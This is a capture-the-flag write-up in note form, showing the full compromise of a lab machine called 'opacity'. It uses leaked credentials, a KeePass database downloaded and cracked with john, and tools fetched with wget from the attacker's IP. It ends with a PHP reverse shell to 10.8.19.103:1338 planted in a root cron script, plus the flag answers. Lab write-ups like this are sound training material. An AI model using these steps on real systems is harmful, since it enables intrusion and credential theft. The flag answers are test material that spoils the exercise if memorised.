@@ -489,3 +489,495 @@ cat login.php
 </body>
 </html>
 
+administrator:oncloud9
+
+www-data@opacity:/var$ cd backups
+cd backups
+www-data@opacity:/var/backups$ ls
+ls
+apt.extended_states.0  apt.extended_states.1.gz  backup.zip
+www-data@opacity:/var/backups$ unzip backup.zip
+unzip backup.zip
+Archive:  backup.zip
+checkdir error:  cannot create lib
+                 Permission denied
+                 unable to process lib/.
+error:  cannot create script.php
+        Permission denied
+
+www-data@opacity:/home/sysadmin/scripts/lib$ cat backup.inc.php
+cat backup.inc.php
+<?php
+
+ini_set('max_execution_time', 600);
+ini_set('memory_limit', '1024M');
+
+function zipData($source, $destination) {
+	if (extension_loaded('zip')) {
+		if (file_exists($source)) {
+			$zip = new ZipArchive();
+			if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
+				$source = realpath($source);
+				if (is_dir($source)) {
+					$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+					foreach ($files as $file) {
+						$file = realpath($file);
+						if (is_dir($file)) {
+							$zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
+						} else if (is_file($file)) {
+							$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
+						}
+					}
+				} else if (is_file($source)) {
+					$zip->addFromString(basename($source), file_get_contents($source));
+				}
+			}
+			return $zip->close();
+		}
+	}
+	return false;
+}
+?>
+
+uhmm
+
+uploading linpeas.sh
+
+www-data@opacity:/opt$ cd /tmp
+cd /tmp
+www-data@opacity:/tmp$ wget http://10.8.19.103:1234/linpeas.sh
+wget http://10.8.19.103:1234/linpeas.sh
+--  http://10.8.19.103:1234/linpeas.sh
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 828098 (809K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh          100%[===================>] 808.69K   374KB/s    in 2.2s    
+
+(374 KB/s) - ‘linpeas.sh’ saved [828098/828098]
+
+www-data@opacity:/tmp$ chmod +x linpeas.sh
+chmod +x linpeas.sh
+www-data@opacity:/tmp$ ./linpeas.sh
+./linpeas.sh
+
+                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
+         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
+         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
+         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
+          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
+               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
+                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀
+
+    /---------------------------------------------------------------------------------\
+    |                             Do you like PEASS?                                  |
+    |---------------------------------------------------------------------------------| 
+    |         Get the latest version    :     https://github.com/sponsors/carlospolop |
+    |         Follow on Twitter         :     @carlospolopm                           |
+    |         Respect on HTB            :     SirBroccoli                             |
+    |---------------------------------------------------------------------------------|
+    |                                 Thank you!                                      |
+    \---------------------------------------------------------------------------------/
+          linpeas-ng by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 95% a PE vector
+  RED: You should take a look to it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
+  LightMagenta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+
+╔══════════╣ Analyzing Keepass Files (limit 70)
+-rwxrwxr-x 1 sysadmin sysadmin 1566 Jul  8  2022 /opt/dataset.kdbx
+
+www-data@opacity:/tmp$ cd /opt
+cd /opt
+www-data@opacity:/opt$ ls
+ls
+dataset.kdbx
+www-data@opacity:/opt$ file dataset.kdbx
+file dataset.kdbx
+dataset.kdbx: Keepass password database 2.x KDBX
+
+www-data@opacity:/opt$ python3 -m http.server 
+python3 -m http.server 
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.8.19.103 - - [10/Apr/2023 00:16:32] "GET /dataset.kdbx HTTP/1.1" 200 -
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ wget http://10.10.142.194:8000/dataset.kdbx
+--  http://10.10.142.194:8000/dataset.kdbx
+Connecting to 10.10.142.194:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 1566 (1.5K) [application/octet-stream]
+Saving to: ‘dataset.kdbx’
+
+dataset.kdbx         100%[====================>]   1.53K  --.-KB/s    in 0s      
+
+(20.9 MB/s) - ‘dataset.kdbx’ saved [1566/1566]
+
+https://www.thedutchhacker.com/how-to-crack-a-keepass-database-file/
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ keepass2john dataset.kdbx > hash_opacity
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash_opacity 
+Using default input encoding: UTF-8
+Loaded 1 password hash (KeePass [SHA256 AES 32/64])
+Cost 1 (iteration count) is 100000 for all loaded hashes
+Cost 2 (version) is 2 for all loaded hashes
+Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+741852963        (dataset)     
+1g 0:00:00:18 DONE () 0.05491g/s 48.32p/s 48.32c/s 48.32C/s chichi..david1
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ sudo apt -y install keepassx
+
+open database and enter the pass then unlock it
+
+sysadmin:Cl0udP4ss40p4city#8700
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ ssh sysadmin@10.10.142.194
+The authenticity of host '10.10.142.194 (10.10.142.194)' can't be established.
+ED25519 key fingerprint is SHA256:VdW4fa9h5tyPlpiJ8i9kyr+MCvLbz7p4RgOGPbWM7Nw.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.142.194' (ED25519) to the list of known hosts.
+sysadmin@10.10.142.194's password: 
+Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-139-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon 10 Apr 2023 12:26:00 AM UTC
+
+  System load:  0.54              Processes:             129
+  Usage of /:   57.5% of 8.87GB   Users logged in:       0
+  Memory usage: 45%               IPv4 address for eth0: 10.10.142.194
+  Swap usage:   0%
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+ * Introducing Expanded Security Maintenance for Applications.
+   Receive updates to over 25,000 software packages with your
+   Ubuntu Pro subscription. Free for personal use.
+
+     https://ubuntu.com/pro
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+Last login: Wed Feb 22 08:13:43 2023 from 10.0.2.15
+sysadmin@opacity:~$ pwd
+/home/sysadmin
+sysadmin@opacity:~$ ls
+local.txt  scripts
+sysadmin@opacity:~$ cat local.txt
+6661b61b44d234d230d06bf5b3c075e2
+
+sysadmin@opacity:/tmp$ wget http://10.8.19.103:1234/pspy64
+--  http://10.8.19.103:1234/pspy64
+Connecting to 10.8.19.103:1234... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3104768 (3.0M) [application/octet-stream]
+Saving to: ‘pspy64’
+
+pspy64               100%[====================>]   2.96M  1.12MB/s    in 2.6s    
+
+(1.12 MB/s) - ‘pspy64’ saved [3104768/3104768]
+
+sysadmin@opacity:/tmp$ chmod +x pspy64
+sysadmin@opacity:/tmp$ ./pspy64
+pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
+
+     ██▓███    ██████  ██▓███ ▓██   ██▓
+    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
+    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
+    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
+    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
+    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
+    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
+    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
+                   ░           ░ ░     
+                               ░ ░     
+
+Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
+Draining file system events due to startup...
+done
+ CMD: UID=1000  PID=27648  | ./pspy64 
+ CMD: UID=0     PID=27647  | 
+ CMD: UID=0     PID=27646  | 
+ CMD: UID=1000  PID=27610  | -bash 
+ CMD: UID=1000  PID=27609  | sshd: sysadmin@pts/1 
+ CMD: UID=1000  PID=27477  | (sd-pam) 
+ CMD: UID=0     PID=27476  | 
+ CMD: UID=1000  PID=27475  | /lib/systemd/systemd --user 
+ CMD: UID=0     PID=27462  | sshd: sysadmin [priv] 
+ CMD: UID=33    PID=27420  | python3 -m http.server 
+ CMD: UID=0     PID=27409  | 
+ CMD: UID=0     PID=26946  | 
+ CMD: UID=0     PID=26444  | 
+ CMD: UID=33    PID=13311  | /usr/sbin/apache2 -k start 
+ CMD: UID=33    PID=13310  | /usr/sbin/apache2 -k start 
+ CMD: UID=33    PID=13309  | /usr/sbin/apache2 -k start 
+ CMD: UID=33    PID=13305  | /usr/sbin/apache2 -k start 
+ CMD: UID=33    PID=13304  | /usr/sbin/apache2 -k start 
+ CMD: UID=33    PID=2886   | /bin/bash 
+ CMD: UID=33    PID=2885   | python3 -c import pty;pty.spawn("/bin/bash") 
+ CMD: UID=33    PID=2881   | sh 
+ CMD: UID=33    PID=2880   | sh -c sh 
+ CMD: UID=0     PID=2725   | 
+ CMD: UID=33    PID=2291   | /usr/sbin/apache2 -k start 
+ CMD: UID=0     PID=890    | /usr/sbin/smbd --foreground --no-process-group 
+ CMD: UID=0     PID=877    | /usr/sbin/smbd --foreground --no-process-group 
+ CMD: UID=0     PID=876    | /usr/sbin/smbd --foreground --no-process-group 
+ CMD: UID=0     PID=807    | /usr/sbin/smbd --foreground --no-process-group 
+ CMD: UID=33    PID=801    | php-fpm: pool www                                                             
+ CMD: UID=33    PID=800    | php-fpm: pool www                                                             
+ CMD: UID=0     PID=760    | /usr/sbin/apache2 -k start 
+ CMD: UID=0     PID=744    | /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal 
+ CMD: UID=0     PID=723    | /usr/sbin/ModemManager 
+ CMD: UID=0     PID=678    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
+ CMD: UID=0     PID=639    | /sbin/agetty -o -p -- \u --noclear tty1 linux 
+ CMD: UID=0     PID=637    | /sbin/agetty -o -p -- \u --keep-baud 115200,38400,9600 ttyS0 vt220 
+ CMD: UID=1     PID=629    | /usr/sbin/atd -f 
+ CMD: UID=0     PID=626    | /usr/lib/udisks2/udisksd 
+ CMD: UID=0     PID=621    | /lib/systemd/systemd-logind 
+ CMD: UID=0     PID=619    | /usr/lib/snapd/snapd 
+ CMD: UID=104   PID=617    | /usr/sbin/rsyslogd -n -iNONE 
+ CMD: UID=0     PID=614    | /usr/lib/policykit-1/polkitd --no-debug 
+ CMD: UID=0     PID=612    | php-fpm: master process (/etc/php/7.4/fpm/php-fpm.conf)                       
+ CMD: UID=0     PID=610    | /usr/sbin/nmbd --foreground --no-process-group 
+ CMD: UID=0     PID=606    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers 
+ CMD: UID=103   PID=594    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
+ CMD: UID=0     PID=591    | /usr/sbin/cron -f 
+ CMD: UID=0     PID=584    | /usr/bin/amazon-ssm-agent 
+ CMD: UID=0     PID=583    | /usr/lib/accountsservice/accounts-daemon 
+ CMD: UID=101   PID=572    | /lib/systemd/systemd-resolved 
+ CMD: UID=100   PID=569    | /lib/systemd/systemd-networkd 
+ CMD: UID=102   PID=536    | /lib/systemd/systemd-timesyncd 
+ CMD: UID=0     PID=516    | 
+ CMD: UID=0     PID=515    | 
+ CMD: UID=0     PID=508    | 
+ CMD: UID=0     PID=507    | 
+ CMD: UID=0     PID=506    | 
+ CMD: UID=0     PID=502    | 
+ CMD: UID=0     PID=499    | 
+ CMD: UID=0     PID=497    | 
+ CMD: UID=0     PID=489    | /sbin/multipathd -d -s 
+ CMD: UID=0     PID=488    | 
+ CMD: UID=0     PID=487    | 
+ CMD: UID=0     PID=486    | 
+ CMD: UID=0     PID=485    | 
+ CMD: UID=0     PID=378    | /lib/systemd/systemd-udevd 
+ CMD: UID=0     PID=344    | /lib/systemd/systemd-journald 
+ CMD: UID=0     PID=274    | 
+ CMD: UID=0     PID=273    | 
+ CMD: UID=0     PID=226    | 
+ CMD: UID=0     PID=189    | 
+ CMD: UID=0     PID=157    | 
+ CMD: UID=0     PID=122    | 
+ CMD: UID=0     PID=109    | 
+ CMD: UID=0     PID=106    | 
+ CMD: UID=0     PID=97     | 
+ CMD: UID=0     PID=96     | 
+ CMD: UID=0     PID=95     | 
+ CMD: UID=0     PID=93     | 
+ CMD: UID=0     PID=92     | 
+ CMD: UID=0     PID=91     | 
+ CMD: UID=0     PID=90     | 
+ CMD: UID=0     PID=89     | 
+ CMD: UID=0     PID=88     | 
+ CMD: UID=0     PID=87     | 
+ CMD: UID=0     PID=86     | 
+ CMD: UID=0     PID=84     | 
+ CMD: UID=0     PID=83     | 
+ CMD: UID=0     PID=79     | 
+ CMD: UID=0     PID=78     | 
+ CMD: UID=0     PID=77     | 
+ CMD: UID=0     PID=76     | 
+ CMD: UID=0     PID=75     | 
+ CMD: UID=0     PID=74     | 
+ CMD: UID=0     PID=73     | 
+ CMD: UID=0     PID=72     | 
+ CMD: UID=0     PID=71     | 
+ CMD: UID=0     PID=70     | 
+ CMD: UID=0     PID=24     | 
+ CMD: UID=0     PID=23     | 
+ CMD: UID=0     PID=22     | 
+ CMD: UID=0     PID=21     | 
+ CMD: UID=0     PID=20     | 
+ CMD: UID=0     PID=19     | 
+ CMD: UID=0     PID=18     | 
+ CMD: UID=0     PID=17     | 
+ CMD: UID=0     PID=16     | 
+ CMD: UID=0     PID=15     | 
+ CMD: UID=0     PID=14     | 
+ CMD: UID=0     PID=12     | 
+ CMD: UID=0     PID=11     | 
+ CMD: UID=0     PID=10     | 
+ CMD: UID=0     PID=9      | 
+ CMD: UID=0     PID=8      | 
+ CMD: UID=0     PID=6      | 
+ CMD: UID=0     PID=4      | 
+ CMD: UID=0     PID=3      | 
+ CMD: UID=0     PID=2      | 
+ CMD: UID=0     PID=1      | /sbin/init maybe-ubiquity 
+ CMD: UID=0     PID=27658  | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=27657  | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=27659  | /usr/bin/php /home/sysadmin/scripts/script.php 
+ CMD: UID=0     PID=27661  | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=27660  | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=27662  | /bin/sh -c /usr/bin/php /home/sysadmin/scripts/script.php 
+ CMD: UID=0     PID=27665  | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=27664  | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=27666  | /bin/sh -c /usr/bin/php /home/sysadmin/scripts/script.php 
+ CMD: UID=0     PID=27669  | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=27668  | /usr/sbin/CRON -f 
+ CMD: UID=0     PID=27670  | /bin/sh -c /usr/bin/php /home/sysadmin/scripts/script.php 
+
+sysadmin@opacity:/tmp$ cd /home/sysadmin/scripts/
+sysadmin@opacity:~/scripts$ ls
+lib  script.php
+sysadmin@opacity:~/scripts$ cat script.php 
+<?php
+
+//Backup of scripts sysadmin folder
+require_once('lib/backup.inc.php');
+zipData('/home/sysadmin/scripts', '/var/backups/backup.zip');
+echo 'Successful', PHP_EOL;
+
+//Files scheduled removal
+$dir = "/var/www/html/cloud/images";
+if(file_exists($dir)){
+    $di = new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS);
+    $ri = new RecursiveIteratorIterator($di, RecursiveIteratorIterator::CHILD_FIRST);
+    foreach ( $ri as $file ) {
+        $file->isDir() ?  rmdir($file) : unlink($file);
+    }
+}
+?>
+
+sysadmin@opacity:~/scripts/lib$ cat backup.inc.php 
+<?php
+
+ini_set('max_execution_time', 600);
+ini_set('memory_limit', '1024M');
+
+function zipData($source, $destination) {
+	if (extension_loaded('zip')) {
+		if (file_exists($source)) {
+			$zip = new ZipArchive();
+			if ($zip->open($destination, ZIPARCHIVE::CREATE)) {
+				$source = realpath($source);
+				if (is_dir($source)) {
+					$files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($source, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
+					foreach ($files as $file) {
+						$file = realpath($file);
+						if (is_dir($file)) {
+							$zip->addEmptyDir(str_replace($source . '/', '', $file . '/'));
+						} else if (is_file($file)) {
+							$zip->addFromString(str_replace($source . '/', '', $file), file_get_contents($file));
+						}
+					}
+				} else if (is_file($source)) {
+					$zip->addFromString(basename($source), file_get_contents($source));
+				}
+			}
+			return $zip->close();
+		}
+	}
+	return false;
+}
+?>
+
+sysadmin@opacity:~/scripts/lib$ rm backup.inc.php
+rm: remove write-protected regular file 'backup.inc.php'? yes
+sysadmin@opacity:~/scripts/lib$ ls
+application.php     dataresource.php  owlapi.php  registry.php
+bio2rdfapi.php      dataset.php       phplib.php  utils.php
+biopax2bio2rdf.php  fileapi.php       rdfapi.php  xmlapi.php
+sysadmin@opacity:~/scripts/lib$ nano backup.inc.php
+sysadmin@opacity:~/scripts/lib$ tail backup.inc.php 
+}
+echo '<pre>';
+// change the host address and/or port number as necessary
+$sh = new Shell('10.8.19.103', 1338);
+$sh->run();
+unset($sh);
+// garbage collector requires PHP v5.3.0 or greater
+// @gc_collect_cycles();
+echo '</pre>';
+?>
+
+┌──(witty㉿kali)-[~/Downloads]
+└─$ rlwrap nc -lvnp 1338 
+listening on [any] 1338 ...
+connect to [10.8.19.103] from (UNKNOWN) [10.10.142.194] 46062
+SOCKET: Shell has connected! PID: 27916
+whoami
+root
+cd /root
+ls
+proof.txt
+snap
+cat proof.txt
+ac0d56f93202dd57dcb2498c739fd20e
+cd snap
+ls
+lxd
+```
+![[Pasted image 20230409182615.png]]
+![[Pasted image 20230409184553.png]]
+![[Pasted image 20230409192348.png]]
+![[Pasted image 20230409192438.png]]
+What is the  local.txt flag?
+*6661b61b44d234d230d06bf5b3c075e2*
+What is the proof.txt flag?
+*ac0d56f93202dd57dcb2498c739fd20e*
+
+## Notes / Lessons Learned
+[[PWN101]]
+[[PWN101]]
+
